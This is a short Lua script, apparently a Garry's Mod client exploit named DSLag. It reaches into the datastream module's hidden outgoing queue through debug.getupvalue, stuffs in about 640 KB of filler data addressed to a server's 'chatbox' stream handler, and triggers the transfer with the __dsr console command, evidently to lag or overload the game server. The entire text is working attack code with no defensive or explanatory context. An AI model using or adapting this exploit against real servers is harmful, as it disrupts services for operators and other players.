local name, _tempout = debug.getupvalue (datastream.StreamToServer, 2)function DSLag ()	local d1 = string.rep ("a", 128)		local glonData = {}	glonData [#glonData + 1] = "\3\7"	for i = 1, 5000 do		glonData [#glonData + 1] = d1	end	glonData [#glonData + 1] = "\1\1"	local streamName = "EGP_Request_Transmit"	streamName = "derp"	streamName = "chatbox"		local o = {		-- Data information		decdata = "",		encdata = glonData,		sent = 0,		size = 0,		-- Operation state		block = 1,		state = 2,		-- Operation handlers		handler = streamName,		callback = function (...) print ("DSLag: ", ...) end,		acallback = function (...) print ("DSLag: Accept ", ...) end,	}	o.id = table.insert(_tempout,o)	DSO = o	RunConsoleCommand("__dsr","\1",streamName,o.id)end